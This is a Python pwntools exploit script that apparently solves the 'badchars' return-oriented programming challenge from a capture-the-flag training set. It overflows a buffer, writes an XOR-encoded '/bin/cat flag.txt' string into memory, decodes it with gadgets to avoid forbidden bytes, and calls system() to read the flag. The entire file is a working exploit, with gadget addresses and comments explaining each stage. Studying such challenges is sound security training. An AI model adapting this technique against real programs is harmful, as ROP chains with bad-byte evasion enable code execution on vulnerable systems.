#!/usr/bin/env python3

from pwn import *

'''
BAD BYTES
0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73
'''

#ALWAYS DEBUG!
#context.log_level='DEBUG'
context(terminal=['tmux','new-window'],os='linux',arch='amd64')
#0x4009b0 checkBadchars
#0x400989 is after fgets
#0x4009dd leave pwnme
#p = gdb.debug('./badchars','''b main
#                              b pwnme
#                              b *0x400989
#                              b *0x4009b0
#                              b *0x4009dd''')
p = process('./badchars')

junk = ("A"* 40).encode()
#String Argument
#badchars: b i c / <space> f n s
#'/bin/cat' flag.txt ^ 'D' = ("k&-*k'atd"lag.txt)
#V2 Strign less Xoring aka smalled shellcode 417bytes lol

#         "/bin/cat"
bin_cat = "k&-*k'at".encode()
#          ' flag.tx'
flag_txt = 'd"lag.tx'.encode()
#          't
last_bit = "t".ljust(8,"\x00").encode()


#Stage 1 load string into memory @ 0x00601080
#0x0000000000400b3b: pop r12; pop r13; ret;
#0x0000000000400b34: mov qword ptr [r13], r12; ret;
data_start = 0x601080
pop_r12_r13 = p64(0x400b3b)
mov_r13_r12 = p64(0x400b34)
load_str_1 = pop_r12_r13 + bin_cat + p64(data_start) + mov_r13_r12
load_str_2 = pop_r12_r13 + flag_txt + p64(data_start+0x8) + mov_r13_r12
load_str_3 = pop_r12_r13 + last_bit + p64(data_start+0x10) + mov_r13_r12
load_str = load_str_1 + load_str_2 + load_str_3

#Stage 2 modify string in memory @ 0x00601080
#0x0000000000400b40: pop r14; pop r15; ret;
#0x0000000000400b30: xor byte ptr [r15], r14b; ret;
key = "D".ljust(8,"\x00").encode()
pop_r14_r15 = p64(0x400b40)
xor_r15_r14b = p64(0x400b30)

# 'D' ^ '/'
xor_str_0 = pop_r14_r15 + key + p64(data_start) + xor_r15_r14b
# 'D' ^ 'b'
xor_str_1 = pop_r14_r15 + key + p64(data_start+0x1) + xor_r15_r14b
# 'D' ^ 'i'
xor_str_2 = pop_r14_r15 + key + p64(data_start+0x2) + xor_r15_r14b
# 'D' ^ 'n'
xor_str_3 = pop_r14_r15 + key + p64(data_start+0x3) + xor_r15_r14b
# 'D' ^ '/'
xor_str_4 = pop_r14_r15 + key + p64(data_start+0x4) + xor_r15_r14b
# 'D' ^ 'c'
xor_str_5 = pop_r14_r15 + key + p64(data_start+0x5) + xor_r15_r14b
xor_cat = xor_str_0 + xor_str_1 + xor_str_2 + xor_str_3 + xor_str_4 + xor_str_5

# 'D' ^ ' '
xor_str_8 = pop_r14_r15 + key + p64(data_start+0x8) + xor_r15_r14b
# 'D' ^ 'f'
xor_str_9 = pop_r14_r15 + key + p64(data_start+0x9) + xor_r15_r14b
xor_flag = xor_str_8 + xor_str_9

xor_str = xor_cat + xor_flag

#Stage 3 call system with string's memory location
#0x0000000000400b39: pop rdi; ret;
system = p64(0x4009e8)
pop_rdi = p64(0x400b39)
system_call = pop_rdi + p64(data_start) + system

payload = load_str + xor_str + system_call

p.recvuntil('>')
p.sendline(junk+payload)
#p.interactive()
p.recvuntil('>')
flag = p.recvline()
log.success("Flag: "+flag.decode('ascii'))
